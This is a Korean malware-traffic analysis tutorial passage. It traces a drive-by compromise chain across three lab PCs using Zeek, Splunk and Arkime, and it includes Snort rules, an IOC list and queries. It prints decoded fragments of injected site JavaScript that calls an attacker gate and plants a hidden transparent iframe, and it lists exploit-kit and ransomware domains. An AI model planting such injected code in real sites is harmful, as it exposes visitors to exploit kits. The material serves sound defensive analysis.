**숨긴 글자 읽는 법:** `\xNN` = 16진수 NN의 글자(`\x68` = `h`, `\x2f` = `/`, `\x6d` = `m`, `\x61` = `a`). `\uNNNN` = 같은 뜻의 4자리(`\u006e` = `n`, `\u0069` = `i`, `\u002e` = `.`).

| 코드 | 풀면 | 뜻 |
|---|---|---|
| `"\u0057in\x64ows"`, `"MSI\u0045"`, `"\u0047ec\u006bo"`, `"Trid\u0065n\u0074"` | Windows, MSIE, Gecko, Trident | **윈도우 + 일반 브라우저**만 |
| `tdxwSOD.src = "http://st.domandvilma.com/" + j7aMn(2,6) + "viewforum" + j7aMn(2,6) + ".php"` | 게이트 주소 | `j7aMn(2,6)` = **2~6글자 무작위 영문** |
| `"SCR\u0049\x50T"` | SCRIPT | 게이트를 `<script>`로 불러요 |
| `if(main_color_handle.length==0){ … return; }` | 빈 값 → 멈춤 | |
| `<iframe … width=19 height=19 frameborder=0 scrolling='no'>` | 19×19 iframe | 값이 있으면: 게이트가 준 주소로 숨은 iframe |
| `"op\u0061\u0063ity:0"` | opacity:0 | 완전히 투명하게 |

**[데이터] 맞춰 보기:** 실제 요청은 `/fvviewforumqn.php` = `fv` + **`viewforum`** + `qn` + `.php`예요. **mootools-core.js**에 심긴 코드가 게이트를 불렀어요.

**게이트의 응답:**

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
```

```text
GET /fvviewforumqn.php HTTP/1.1
Accept: application/javascript, */*;q=0.8
Referer: http://planetside.co.uk/
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Host: st.domandvilma.com

HTTP/1.1 200 OK
Server: nginx/1.8.0
Content-Type: text/javascript; charset=ISO-8859-1
P3P: policyref="/w3c/p3p.xml", CP="NON DSP COR NID DEVa PSAa PSDa OUR BUS"
Set-Cookie: fltna=…; expires=Fri, 06-Jan-2017 22:09:22 GMT; path=/; domain=st.domandvilma.com
Content-Encoding: gzip

var main_color_handle='';
```

- `Accept: application/javascript` — 브라우저가 **스크립트로** 불렀어요(코드의 `SCRIPT`와 맞아요).
- 1년짜리 `Set-Cookie` + `P3P` — **[추측]** IE는 다른 사이트의 쿠키를 막는데, P3P 헤더가 있으면 허락해요. 게이트가 **다음에 이 방문자를 알아보려는** 거예요.
- 본문: `var main_color_handle='';` — **26바이트, 빈 값**이에요. 심긴 코드가 기다리던 변수가 비어서 `length==0` 쪽으로 가요. iframe이 없어요.

**[추측] 왜 비었을까요?** 게이트는 공격할 방문자를 골라요(브라우저, 나라, IP, 전에 왔는지). 이번 방문은 걸러졌어요. 그 규칙은 서버 안에 있어서 볼 수 없어요.

### 5-3. 코드가 실행됐다는 증거 — 쿠키 (Arkime) { #pc-c-cookie }

PC A(3-2)와 같은 방법이에요. **코드가 실행됐다면 무엇을 남겨야 할까요?** 게이트 값이 비면 `xco56v_(jcvJp4p, oD4RG9, 48)`을 불러요. `xco56v_`는 `document.cookie`에 `expires`와 `domain=` + `document.domain`(= **planetside.co.uk**)을 적어요. 이름과 값은 코드 맨 앞에 있어요.

```text
"\x75se\u0072\x69dA08\u00317FB25"  →  u se r i dA08 1 7FB25  →  useridA0817FB25
oD4RG9 = "30"
```

그래서 코드는 48시간짜리 **`useridA0817FB25=30`**을 만들어야 해요. 게이트 전후 planetside 요청의 `Cookie:` 줄을 비교해요.

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && host.http == planetside.co.uk
```

| 시각 | 요청 (planetside.co.uk) | Cookie |
|---|---|---|
| 22:09:23.764 | `core.js` (포트 49199) | `f602a8df…=c869e74f…` |
| *22:09:24.829* | *게이트 요청* | |
| 22:09:26.423 | `caption.js` (포트 49202) | `f602a8df…=c869e74f…` |
| 22:09:29.950 | `jquerynoconflict.js` (포트 49203) | `f602a8df…=c869e74f…; `**`useridA0817FB25=30`** |

**[데이터] 결과 읽기:**

- 게이트 요청 **뒤에** 새 쿠키가 나타났어요. 이름과 값이 코드와 정확히 같아요.
- **캡처의 어떤 응답에도 `Set-Cookie: useridA08…`가 없어요.** 서버가 아니라 브라우저의 스크립트가 만들었어요.
- `caption.js`(22:09:26)에는 아직 없어요. **[추측]** 게이트 응답이 끝나고 스크립트의 `onload`가 실행되기 전에 브라우저가 `caption.js`를 이미 요청했어요.
- 결론: **심긴 코드가 실행됐고, 빈 값을 받아서 쿠키만 만들고 멈췄어요.** 48시간 동안은 게이트에 다시 묻지도 않아요(`if(demsFw(jcvJp4p)==oD4RG9){return false;}`).

### 5-4. .52의 나머지 통신 { #pc-c-rest }

"감염 안 됨"이라고 쓰려면 **없다는 것**을 확인해야 해요.

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
| stats min(ts) as first_seen, count, sum(response_body_len) as bytes by host
| where first_seen>=1452204564
| eval first_seen=strftime(first_seen, "%H:%M:%S.%3N")
| sort first_seen
```

```text
host                      first_seen    count  bytes
st.domandvilma.com        22:09:24.829  1      26
ajax.aspnetcdn.com        22:09:29.473  1      7203
www.google-analytics.com  22:09:50.429  5      70606
www.outdoorsamoa.com      22:15:29.043  30     574893
fonts.googleapis.com      22:15:31.719  2      1335
fonts.gstatic.com         22:15:37.251  6      207328
www.tripadvisor.com       22:15:37.251  4      31229
www.jscache.com           22:15:48.672  3      534
static.tacdn.com          22:15:50.974  8      30759
www.tripadvisor.co.nz     22:15:52.968  1      406
```

```spl
index=zeek sourcetype=zeek:files rx_hosts="192.168.122.52"
| stats count, max(seen_bytes) as max_bytes by mime_type
| sort - count
```

```spl
index=zeek sourcetype=zeek:http id_orig_h=192.168.122.52
| stats count, min(ts) as first by user_agent
| eval first=strftime(first, "%H:%M:%S")
```

- `sort - count` = 큰 것부터.

**[데이터] 결과 읽기:**

- 게이트 뒤 새 도메인은 CDN과 구글 통계예요. **6분 뒤** 다른 사이트(`outdoorsamoa.com`, 사모아 여행 사이트 — Referer에 `?gclid=…`가 있어요. **[추측]** 구글 광고 클릭)와 구글 글꼴, 트립어드바이저 위젯이에요. 무작위 하위 이름이나 이상한 최상위 도메인이 없어요.
- 파일 종류: 텍스트, HTML, 그림, 글꼴, 자바스크립트뿐이에요. **`application/x-dosexec`도 Flash도 없어요.** 가장 큰 `text/plain`(306,566 B)은 Yahoo 검색 스크립트예요.
- User-Agent: IE 9(202개)와 `Microsoft NCSI`(22:06:13, 윈도우의 "인터넷 되나?" 확인). **`MSIE 7.0`이 없어요.**

**PC C 결론:** **[데이터]** PC A와 같은 종류의 공격(해킹된 사이트 → 심긴 코드 → 게이트)이 시작됐지만, 게이트가 빈 값을 줘서 코드가 멈췄고, 익스플로잇도 다운로드도 새 프로그램도 없었어요. **감염 안 됨.** 사이트는 여전히 해킹된 상태예요. 게이트를 막고 사이트 주인에게 알려요.

---

## 6단계 — 간단한 Snort 룰과 테스트 { #snort }

악성 활동 하나에 아주 간단한 룰 하나씩이에요.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"EK securetopc.top - Sung"; content:"securetopc.top"; nocase; sid:1000051; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"JS downloader counter id - Sung"; content:"/counter/?id="; nocase; sid:1000052; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Gate domandvilma.com - Sung"; content:"domandvilma.com"; nocase; sid:1000054; rev:1;)
```

- `alert tcp` — 조건이 맞는 TCP 패킷에 경보를 내요.
- `$HOME_NET any -> $EXTERNAL_NET 80` — 내부(사설 대역) → 외부 80번 포트, 즉 PC의 HTTP 요청이에요.
- `content:"…"` + `nocase` — 패킷 어디든 이 글자가 있으면, 대소문자 상관없이.
- `sid` 1000000 이상 = 직접 만든 룰, `rev` = 룰 버전.

룰을 **한 줄씩** `\\10.50.10.60\rules\local.rules`에 넣고 pcapbox에서:

```bash
snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
```

**보여야 하는 결과:**

```text
[1/2] 문법 OK
[2/2] /data/pcap/20160107_ALERTS_ON_3_DIFFERENT_HOSTS.pcap
  개수 [gid:sid:rev] 메시지
      9 [1:1000052:1] JS downloader counter id - Sung
      5 [1:1000051:1] EK securetopc.top - Sung
      1 [1:1000054:1] Gate domandvilma.com - Sung
```

**[데이터] 결과 읽기:** 경보 수가 분석에서 찾은 요청 수와 모두 같아요 — `/counter/` 요청 9개(4-1), securetopc.top 요청 5개(랜딩, `.swf` 두 번, `/surprise`, `/officer`), 게이트 요청 1개(5-1). Snort는 맞는 패킷 하나마다 경보 하나를 내고, 요청 하나는 패킷 하나에 들어가요. 다른 통신에서 잘못 울린 경보도 없어요. 출발 IP까지 보려면:

```spl
index=snort sourcetype=snort:alert pcap_case="20160107_ALERTS_ON_3_DIFFERENT_HOSTS"
| stats count, min(_time) as first, max(_time) as last, values(src_ip) as src, values(dest_ip) as dest by sid, msg
| eval first=strftime(first, "%H:%M:%S"), last=strftime(last, "%H:%M:%S")
```

이 룰들은 **이번 사건**에 맞춘 거예요. 공격자는 도메인을 자주 바꿔서, 다음 캠페인에서는 맞지 않을 수 있어요.

---

## 타임라인 (2016-01-07, UTC) { #timeline }

| 시각 | PC | 일 |
|---|---|---|
| 22:05:47 | 모두 | 캡처 시작. .130, .52(22:06:02), .132(22:06:21) DHCP |
| 22:06:35 | B .130 | 빙 |
| 22:07:00–22:08:47 | B .130 | Yahoo Mail 로그인과 사용(HTTPS). 그 뒤는 1~2분마다 자동 새로 고침만 |
| 22:09:01–05 | C .52 | Yahoo에서 planetside.co.uk 검색, 클릭(302) |
| 22:09:12 | C .52 | `planetside.co[.]uk`(해킹됨, `mootools-core.js` 끝에 심긴 코드) |
| 22:09:24 | C .52 | 게이트 `st.domandvilma[.]com` → `var main_color_handle='';` → 쿠키 `useridA0817FB25=30`, **아무 일도 없음** |
| 22:10:08–10 | A .132 | 구글 결과 → `www.koeppl[.]com`(해킹됨, `<html>` 앞의 코드) |
| 22:10:13 | A .132 | 스크립트의 쿠키 `PHP_SESSION_PHP`가 koeppl 요청에 나타남 |
| 22:10:15 | A .132 | 숨은 iframe → EK 랜딩 `uacltr.securetopc[.]top`(89.38.144.75) |
| 22:10:17 | A .132 | Flash 익스플로잇(83 KB) |
| 22:10:26 | A .132 | `gbesbsdsb.securetopc[.]top`에서 암호화된 페이로드(412 KB) |
| 22:10:47–22:12:14 | A .132 | `MSIE 7.0`이 `bizsouls[.]com`에 암호화된 체크인, 같은 메시지를 `estudiobarco.com[.]ar`에 |
| 22:11:53–22:12:47 | B .130 | 스크립트 `/counter/?id=` × 9 → `.gif` 이름의 EXE 6개(4종류) |
| 22:15:29 | C .52 | 평범한 웹 서핑(outdoorsamoa, 트립어드바이저) |
| 22:16:46–22:16:57 | A .132 | 사용자가 **CryptoWall "Decrypt service"** 페이지를 열고 캡차 입력 → "Your files are encrypted", 500 USD |
| 22:17:18 | 모두 | 캡처 끝 |

---

## 지표 { #iocs }

| 지표 | 종류 | PC | 역할 |
|---|---|---|---|
| `www.koeppl[.]com` 92.51.131.150 | 도메인 / IP | A | 해킹된 사이트(`<html>` 앞의 코드) |
| `uacltr.securetopc[.]top`, `gbesbsdsb.securetopc[.]top` 89.38.144.75 | 도메인 / IP | A | 익스플로잇 킷(랜딩, Flash, 페이로드) |
| `bizsouls[.]com` 188.138.101.154, `estudiobarco.com[.]ar` 50.22.11.55 | 도메인 / IP | A | CryptoWall 체크인(해킹된 사이트) |
| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | 도메인 / IP | A | CryptoWall 결제 페이지(tor2web) |
| 6631e8c0d5f07004fabff81872f10d5e | MD5 | A | Flash 익스플로잇 |
| 4fd5e80b20ea9d39925155d9f8b2aa1d | MD5 | A | 두 C2 사이트에 보낸 체크인 본문 |
| 16VXHKKtwGx8YG9qaEqszCLscUxtm326LZ | 비트코인 주소 | A | 몸값 결제 |
| `ma-wt.com[.]sa` 216.158.85.7, `dariostoka[.]com` 174.36.186.235, `freshanointingministries-sc[.]org` 184.168.173.1 | 도메인 / IP | B | EXE 다운로드(`/counter/?id=`) |
| 9f756e72…4a79, d411bf37…7f50f7, e851eb24…cebc, 92a4d0ae…8496 | MD5 | B | 내려받은 EXE 4개 |
| `brooke.hamilton@rackspace.co.uk`, `sagemedia.org` | `id=` 안의 값 | B | 메일 담당에게 넘길 캠페인 정보 |
| `planetside.co[.]uk` 67.225.139.108 | 도메인 / IP | C | 해킹된 사이트(`mootools-core.js`에 심긴 코드) |
| `st.domandvilma[.]com` 192.185.21.183 | 도메인 / IP | C | 게이트(빈 값) |

---

## 복사해서 쓰는 쿼리 { #query-sheet }

`<case>`를 케이스 이름으로 바꿔요.

```spl
index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=192.168.0.0/16 | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h | eval first=strftime(first,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dhcp pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t client_addr assigned_addr mac host_name msg_types server_addr | sort t
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(host) as sites by id_orig_h user_agent | sort id_orig_h first
index=zeek sourcetype=zeek:dns pcap_case=<case> id_resp_p=53 | stats count by id_orig_h id_resp_h
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host | sort id_orig_h first
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer user_agent status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> user_agent="*MSIE 7.0*" | eval time=strftime(ts,"%H:%M:%S.%3N") | table time id_resp_h host uri referrer status_code resp_mime_types response_body_len | sort time
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first, max(ts) as last, count by server_name | eval first=strftime(first,"%H:%M:%S.%3N"), last=strftime(last,"%H:%M:%S.%3N") | sort first
index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> server_name="<sni>" | sort ts | delta ts as gap | eval time=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table time id_orig_p id_resp_h gap
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> id_resp_p=443 | eval end=ts+duration | where end>=<epoch1> AND end<<epoch2> | table ts end id_orig_p id_resp_h resp_bytes | addcoltotals resp_bytes
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p | where first_seen>=<epoch> | eval first_seen=strftime(first_seen,"%H:%M:%S.%3N") | sort first_seen
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count, max(seen_bytes) as max_bytes by mime_type | sort - count
```

**Arkime** (`http.uri` = 도메인 + 경로라는 것을 기억해요)

```text
tags == <case> && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
tags == <case> && ip.src == 192.168.122.132 && http.uri == */officer/*
tags == <case> && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
tags == <case> && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
tags == <case> && ip.src == 192.168.122.130 && http.uri == */counter/*
tags == <case> && ip.src == 192.168.122.130 && port.dst == 443
tags == <case> && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
tags == <case> && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
tags == <case> && ip.src == 192.168.122.52 && host.http == planetside.co.uk
```

---

## 배운 점 { #lessons }

1. **경보 셋, 답 셋.** 경보는 "여기를 봐"이지 "감염됐다"가 아니에요. 경보 **뒤에** 무슨 일이 있었는지로 PC마다 판단해요.
2. **감염 = 새로운 것이 실행됨.** PC A와 B에는 브라우저가 아닌 **새 User-Agent**(`MSIE 7.0`)가 나타나요. PC C에는 끝까지 없어요.
3. **실행 증거: 흔적을 먼저 정하고 찾아요.** PC A와 PC C의 쿠키는 심긴 코드가 만들었고, 어떤 서버도 그 쿠키를 준 적이 없어요.
4. **Referer는 페이지를 알려 줄 뿐, 어느 스크립트인지도, 사람이 클릭했는지도 알려 주지 않아요.** 풀어 본 코드, 페이지가 계속 열려 있었다는 사실, 쿠키로 판단해요.
5. **크기가 많은 걸 말해요.** 26바이트 응답은 익스플로잇 킷일 수 없고, Flash 뒤에 오는 형식 없는 412 KB는 거의 확실히 페이로드예요.
6. **이름표는 속여도 내용은 못 속여요.** `image/gif`와 `.gif` 이름이지만 Zeek의 `application/x-dosexec`는 "프로그램"이라고 말해요.
7. **풀지 않고 비교해요.** 암호화된 본문이 같다는 것(Arkime Body MD5s)으로 PC A의 C2 목록을 증명했어요.
8. **`stats min/max`는 중간을 숨겨요.** 시간을 연결하기 전에 `delta`로 펼쳐요. PC B의 "다운로드 6초 전 웹메일"은 자동 새로 고침이었어요.
9. **도구의 단위를 알아요.** Arkime 세션 = TCP 연결 하나, Arkime 그래프는 세션의 바이트를 마지막 패킷 시각에 놓음, Arkime의 `http.uri`에는 도메인이 들어 있음.
10. **모든 방법이 무언가를 찾지는 않아요.** DNS 없는 연결 찾기도, PC B의 다운로드 뒤 확인도 아무것도 없었어요. 그것도 결과예요.
11. **사용자의 행동도 중요해요.** PC A의 사용자는 몸값 페이지를 열고 캡차까지 입력했어요. 누가 돈을 내기 전에 대응팀에 알려요.

## 참고 { #references }

- [Sorting through the alerts — 같은 Splunk 중심 방법](socgholish-fake-chrome-update-wscript-c2.md) · [피싱 미끼에서 EK 드라이브바이까지](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Zeek 로그](../../network/zeek/index.md) · [files.log](../../network/zeek/files-log.md) · [conn.log](../../network/zeek/conn-log.md)
- 원본 실습: [malware-traffic-analysis.net — 2016-01-07 Alerts on 3 different hosts](https://malware-traffic-analysis.net/2016/01/07/index.html) · [답](https://www.malware-traffic-analysis.net/2016/01/07/page2.html)
